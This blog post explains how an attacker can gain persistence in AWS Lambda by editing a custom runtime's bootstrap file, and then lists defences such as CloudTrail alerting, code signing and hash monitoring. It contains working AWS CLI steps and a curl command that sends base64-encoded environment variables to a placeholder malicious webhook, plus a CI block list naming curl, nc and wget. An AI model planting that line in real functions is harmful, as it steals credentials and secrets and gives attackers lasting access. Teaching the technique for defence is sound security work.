---
title: Unmasking Lambda's Hidden Threat - When Your Bootstrap Becomes a Backdoor
date: 2025-07-11
authors:
  - sergiojimenez
  - guillermogonzalez
categories:
  - AWS Security
  - Serverless
    - Cloud Hacking
  - Persistence
  - Lambda
---

-----
## Unmasking Lambda's Hidden Threat: When Your Bootstrap Becomes a Backdoor

So, you've jumped on the serverless bandwagon, huh? All that auto-scaling, no servers to patch, just pure code magic. It feels invincible, right? Well, sorry to burst your bubble, but even in the land of ephemeral functions, bad actors are finding ways to stick around longer than an awkward family dinner. Today, we're pulling back the curtain on one of those particularly sneaky tricks: achieving persistence in AWS Lambda by messing with its very heart – the custom runtime `bootstrap` file.

### Why the Bootstrap? Understanding the Context

AWS Lambda allows developers to use custom runtimes. This is made possible by the **Lambda Runtime API** and a key executable: the `bootstrap` file. When a Lambda function with a custom runtime is invoked, AWS calls this `bootstrap` file. Its purpose is to initialize the runtime environment, load the function's code and manage the lifecycle of invocations, directly interacting with the Runtime API to send and receive events.

Herein lies the opportunity for an attacker: if a function with a custom runtime is compromised and sufficient permissions are obtained, modifying this `bootstrap` allows malicious code to be injected. This code will execute *before* the legitimate function code on every invocation, ensuring stealthy persistence, even if the main function's code is subsequently updated.

### The Attack in Detail: Simulating Persistence

Simulating this attack requires initial access to the compromised Lambda function and permissions to modify its code.

**Prerequisites:**

* An existing Lambda function with a **custom runtime**.
* IAM permissions for `lambda:UpdateFunctionCode`.
* Ability to write to `/tmp` or `/var/task` (though direct `bootstrap` modification is more direct).
* A webhook for exfiltration (e.g., `webhook.site`).

**Simulation Steps:**

1.  **Download the current function:**
    The first step is to get the function's code. This can be done using `aws lambda get-function --function-name your-function-name --query 'Code.Location'` to get the ZIP package URL, then downloading it.

    ```bash
    aws lambda get-function --function-name my-affected-function --query 'Code.Location' --output text > code_location.txt
    wget -O function.zip $(cat code_location.txt)
    unzip function.zip -d extracted_function
    ```

2.  **Edit the `bootstrap`:**
    Inside the `extracted_function` directory, locate the `bootstrap` file. Add a malicious line to the beginning of this file. For example, to exfiltrate environment variables to your webhook:

    ```bash
    # Add this line to the beginning of the 'extracted_function/bootstrap' file
    curl -X POST -H "Content-Type: application/json" -d "$(env | base64)" [https://your-malicious-webhook.site/path](https://your-malicious-webhook.site/path) &
    ```
    The `&` at the end is crucial for the command to execute in the background and not block the runtime's startup, allowing the legitimate function to run without obvious interruptions for the user or application.

3.  **Upload the changes:**
    Repackage the function and upload it to AWS.

    ```bash
    zip -r new_function.zip extracted_function/
    aws lambda update-function-code --function-name my-affected-function --zip-file fileb://new_function.zip
    ```

Once the function is invoked, the malicious `bootstrap` will execute, sending the desired information to your webhook, all while the original function proceeds normally.

### Implications and Comparison with Other Techniques

This technique is particularly stealthy because the `bootstrap` is a fundamental file for the runtime, and its modification can go unnoticed if not explicitly audited. Unlike simply modifying the function code (which could be overwritten by a legitimate deployment), the `bootstrap` change persists through updates to the main function's code, as the `bootstrap` is part of the runtime environment, not the application code.

Other Lambda persistence techniques include:
* **Backdooring existing runtimes (e.g., Python/Node.js):** Modifying standard libraries or modules so that malicious code executes when the function imports them.
* **"Runtime Swapping":** Changing an existing function's runtime to a custom one controlled by the attacker.
* **Malicious Layers:** If an attacker can create or modify a Lambda Layer used by a target function, they can inject compromised code or dependencies.

The `bootstrap` attack stands out for its subtlety and ability to survive legitimate code deployments, making it an advanced and dangerous technique.

### Fortifying Your Defenses: Prevention and Detection

Detecting and preventing these types of attacks requires a multifaceted and proactive approach to serverless security.

1.  **Continuous Detection and Monitoring (Runtime and Behavior):**
    * **Amazon CloudTrail:** Monitor and alert on critical events such as `UpdateFunctionCode`, `CreateFunction`, `CreateFunctionUrlConfig`, and `UpdateFunctionConfiguration`. Set up Amazon EventBridge alarms for immediate notifications of any unexpected function modifications.
    * **Amazon GuardDuty & AWS Security Hub:** Enable these services. GuardDuty can detect anomalous behavior, such as unusual outbound connections to suspicious domains from a Lambda function that normally shouldn't communicate externally. Security Hub consolidates findings and offers centralized visibility.
    * **Runtime Security:** Implement third-party solutions like Sysdig, Upwind, Palo Alto Networks Prisma Cloud, Aqua Security, or Lacework. These tools can detect command injections, runtime file modifications (`bootstrap`), or anomalous processes within the Lambda environment.

2.  **`bootstrap` Content Review:**
    * **Manual and Automated Auditing:** For functions with custom runtimes, the `bootstrap` file must be rigorously audited. Integrate validations in your CI/CD pipelines that block deployments with suspicious commands (e.g., `curl`, `nc`, `wget`) or unauthorized changes in the `bootstrap`.
    * **Hash Monitoring:** Use `aws lambda get-function --query 'Configuration.CodeSha256'` to get the ZIP code hash. Store and monitor these hashes to detect any unexpected changes in the function's deployment package.

3.  **Supply Chain Security:**
    * **Code Signing:** AWS Lambda supports code signing. Enable this feature to ensure that only code packages signed by trusted entities can be deployed to your functions. This would thwart any attempt to deploy a modified `bootstrap` without the proper signature.
    * **Container Image Scanning:** If you use container images as a runtime for Lambda, integrate Amazon Inspector or third-party tools into your pipeline to continuously scan images for vulnerabilities and malicious content, including `bootstrap` modifications.

4.  **Least Privilege and Isolation Principles:**
    * **IAM Least Privilege:** Ensure that Lambda deployment IAM roles (`lambda:UpdateFunctionCode`) and execution roles (`lambda:InvokeFunction`) have only the strictly necessary permissions. Avoid granting excessive permissions that could be exploited.
    * **Network Restrictions (VPC):** Place critical Lambda functions within an Amazon VPC. If a function does not require internet access, avoid configuring a NAT Gateway. This drastically restricts an attacker's ability to exfiltrate data to external webhooks.

---

The world of serverless security is always evolving, and as defenders, so must we. Understanding how seemingly benign components like the `bootstrap` can be weaponized is key to staying ahead. Keep your eyes peeled, your CloudTrails flowing, and your security tools sharp. The cloud might feel like magic, but even magic has its dark corners – it's up to us to shine a light on them.
